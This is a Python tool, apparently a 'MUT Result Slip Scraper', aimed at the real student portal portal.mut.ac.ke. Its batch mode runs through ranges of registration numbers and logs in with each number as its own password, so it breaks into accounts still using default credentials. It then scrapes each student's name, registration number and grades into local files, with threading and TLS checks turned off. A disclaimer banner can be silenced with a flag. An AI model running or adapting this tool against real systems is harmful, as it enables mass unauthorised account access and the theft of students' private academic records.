import sys
import subprocess

required_libs = [
    "requests",
    "bs4",
    "urllib3",
    "colorama",
    "argparse",
]

missing_libs = []
for lib in required_libs:
    try:
        __import__(lib)
    except ImportError:
        missing_libs.append(lib)

if missing_libs:
    print(f"Missing required libraries: {', '.join(missing_libs)}")
    choice = input("Do you want to install them now? (y/n): ").strip().lower()

    if choice == "y": # try install
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_libs)
        print("Libraries installed successfully. Restarting script...\n")
        python = sys.executable
        subprocess.check_call([python] + sys.argv)
        sys.exit(0)
    else:
        print("Please install the missing libraries manually and restart the script.")
        sys.exit(1)

import requests
from bs4 import BeautifulSoup
import urllib.parse
import os
import re
import argparse
from concurrent.futures import ThreadPoolExecutor
import time
import urllib3
from colorama import Fore, Style


print(Fore.GREEN + "All required libraries are installed and imported successfully!" + Style.RESET_ALL)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #mute warn ssl

class PortalScanner:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.base_url = 'https://portal.mut.ac.ke'

        self.session.verify = False  # fuck ssl
        
    """
        self.session.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
   """
        
    def _get_verification_token(self, response):
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': '__RequestVerificationToken'})
        return token['value'] if token else None
    
    def login(self):
        login_url = f'{self.base_url}/'
        try:
            initial_response = self.session.get(login_url)
            verification_token = self._get_verification_token(initial_response)
            
            login_payload = {
                'Username': urllib.parse.quote(self.username),
                'Password': self.password,
                '__RequestVerificationToken': verification_token,
                'RememberMe': 'false'
            }
            
            login_response = self.session.post(login_url, data=login_payload, 
                                               allow_redirects=True)
            
            if login_response.status_code == 500:
                return False
            return login_response.status_code == 200 or login_response.status_code == 302
        
        except requests.exceptions.SSLError as e:
            print(f"SSL Error for {self.username} - check Burp proxy settings")
            return False
        except Exception as e:
            print(f"Login error for {self.username}: {str(e)}")
            return False
    
    def get_result_slip(self, year='YEAR 1', semester=''):
        if not self.login():
            return None
        
        try:
            semesters_url = f'{self.base_url}/Academic/GetSelYearSemesters?year={urllib.parse.quote(year)}'
            self.session.post(semesters_url)
            
            result_slip_url = f'{self.base_url}/Academic/Reports'
            result_slip_params = {
                'isresult': 'true',
                'year': year,
                'semester': semester
            }
            
            result_slip_response = self.session.get(result_slip_url, params=result_slip_params)
            
            if result_slip_response.status_code == 500:
                return None
            
            if result_slip_response.status_code == 200:
                return self._parse_result_slip(result_slip_response.text, year)
            else:
                print(f"Failed to retrieve result slip for {self.username} - {year}. Status code: {result_slip_response.status_code}")
                return None
        
        except requests.exceptions.SSLError as e:
            print(f"SSL Error retrieving results for {self.username} - check Burp proxy settings and/or dissable ssl")
            return None
        except Exception as e:
            # print(f"Error retrieving result slip for {self.username} - {year}: {str(e)}") #supp aex
            return None

    def _parse_result_slip(self, html_content, year):

        # print (html_content)
        # print("\n\n\n--------x-----------\n\n\n")
        soup = BeautifulSoup(html_content, 'html.parser')
        # custom passer
        

        stu_info = {}
        d_info = soup.find_all('div', recursive=True)

        for div in d_info:
            str_tag = div.find('strong')
        
            if str_tag:
                # print(str_tag)
                f_name = str_tag.text.replace(':', '').strip().lower()
                val = div.get_text().replace(str_tag.text, '').strip()
                
                stu_info[f_name] = val
                
        


        full_name = stu_info["student name"]
        reg_no = stu_info["reg no"]

        # name_elem = soup.find('strong', string='STUDENT NAME:')
        # full_name = name_elem.find_next('div').get_text(strip=True) if name_elem else 'Unknown'
        
        # reg_no_elem = soup.find('strong', string='REG NO:')
        # reg_no = reg_no_elem.find_next('div').get_text(strip=True) if reg_no_elem else 'Unknown'



        courses = []
        table_rows = soup.find_all('tr', {'class': None})
        for row in table_rows:
            cols = row.find_all('td')
            if len(cols) >= 4:
                course_code = cols[0].get_text(strip=True)
                course_name = cols[1].get_text(strip=True)
                grade = cols[3].get_text(strip=True)
                if course_code and course_name and grade:
                    courses.append(f"{course_code}\t{course_name}\t{grade}")
        
        return {
            'full_name': full_name,
            'reg_no': reg_no,
            'year': year,
            'courses': courses
        }
    
    def get_all_years(self):
        results = []
        first_year_result = self.get_result_slip(year='YEAR 1')
        if not first_year_result:  # skip
            return None
            
        results.append(first_year_result)
        
        for year in ['YEAR 2', 'YEAR 3', 'YEAR 4', 'YEAR 5']:
            result = self.get_result_slip(year=year)
            if result and result['courses']:
                results.append(result)
        
        return results
    
    def save_result_slip(self, results_data):
        if not results_data:
            return None
        
    
        os.makedirs('results', exist_ok=True)
        
        reg_parts = self.username.split('/')
        course_code = reg_parts[0].lower()
        unique_id = reg_parts[1]
        
        first_name, last_name = results_data[0]['full_name'].capitalize().split()
      
        filename = f'results/{course_code}-{first_name}-{last_name}.{unique_id}.txt'
        
    
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"Student: {results_data[0]['full_name']}\n")
            f.write(f"Registration No: {results_data[0]['reg_no']}\n\n")
            
            for result in results_data:
                f.write(f"--{result['year']}--\n")
                if result['courses']:
                    f.write("Course Code\tCourse Name\tGrade\n")
                    f.write("\n".join(result['courses']))
                    f.write("\n\n")
        
        return filename

def process_single_registration(username, password):
    scraper = PortalScanner(username, password)
    results = scraper.get_all_years()
    if results:
        saved_path = scraper.save_result_slip(results)
        if saved_path:
            print(f"\n{username} - Result slip saved to {saved_path}")
    else:
        print(f"\rNo valid results found for {username} - skipping", end='', flush=True)

def extract_range_from_pattern(pattern):
    parts = pattern.split('/')
    if len(parts) != 3:
        return None
    
    prefix = parts[0]
    year = parts[2]
    
    range_part = parts[1].strip('{}')
    range_numbers = range_part.split('-')
    
    if len(range_numbers) != 2:
        return None
    
    try:
        start_num = int(range_numbers[0])
        end_num = int(range_numbers[1])
        return prefix, start_num, end_num, year
    except ValueError:
        return None
# def print_banner():
#     banner = """
# __/\\\_______/\\\________________/\\\\\\________/\\\\\\\_________/\\\__________________________________/\\\\\\\\\\\\\\\_        


def process_batch_registrations(pattern, num_threads=1):
    range_info = extract_range_from_pattern(pattern)
    if not range_info:
        print(f"Invalid registration pattern: {pattern}")
        print("Pattern should be like: SC200/{0000-1000}/2022")
        return
    
    prefix, start_num, end_num, year = range_info
    prefix = prefix.upper()
    total_count = end_num - start_num + 1
    processed_count = 0
    
    def process_registration(num):
        nonlocal processed_count
        processed_count += 1
        percentage = (processed_count / total_count) * 100
        
        padded_num = str(num).zfill(4)  # padding
        username = f"{prefix}/{padded_num}/{year}"
        password = f"{prefix}/{padded_num}/{year}"
        
        scraper = PortalScanner(username, password)
        results = scraper.get_all_years()
        if results:
            saved_path = scraper.save_result_slip(results)
            if saved_path:
                print(f"\n{username} - Result slip saved to {saved_path}")
        else:
            print(f"\rNo valid results found for {username} - skipping   [processed {processed_count}/{total_count}]  {percentage:.1f}%", end='', flush=True)
    
    if num_threads > 1:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(process_registration, range(start_num, end_num + 1))
    else:
        for num in range(start_num, end_num + 1):
            process_registration(num)
    print() 
    
    def process_registration(num):
        padded_num = str(num).zfill(4)  # padding
        username = f"{prefix}/{padded_num}/{year}"
        password = f"{prefix}/{padded_num}/{year}"
        # print(f"Processing {username}")   Too noisy
        process_single_registration(username, password)
    
    if num_threads > 1:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(process_registration, range(start_num, end_num + 1))
    else:
        for num in range(start_num, end_num + 1):
            process_registration(num)

def main():
    parser = argparse.ArgumentParser(description='MUT Result Slip Scraper')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--username', help='Single student registration number')
    group.add_argument('-U', '--batch-pattern', help='Batch registration pattern (e.g., SC200/{0000-1000}/2022)')
    parser.add_argument('-p', '--password', help='Password (required with -u)')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Number of threads for batch processing')
    parser.add_argument('-m', '--mute', action="store_true", help='Mute warning Message')
    
    args = parser.parse_args()

    if not args.mute:
        print(Fore.RED + "\t\tWARNING" + Style.RESET_ALL + "\n")
        print(Fore.BLUE + "NOT RESPONSIBLE FOR IRRESPONSIBLE USE OF SCRIPT" + Style.RESET_ALL)
        print(Fore.GREEN + "ASK AFFECTED PARTIES TO CHANGE DEFAULT PASS" + Style.RESET_ALL + "\n")
        time.sleep(1)
    
    if args.username:
        if not args.password:
            parser.error("Password is required when using -u/--username")
        process_single_registration(args.username, args.password)
    else:
        process_batch_registrations(args.batch_pattern, args.threads)


if __name__ == '__main__':
   
    main()
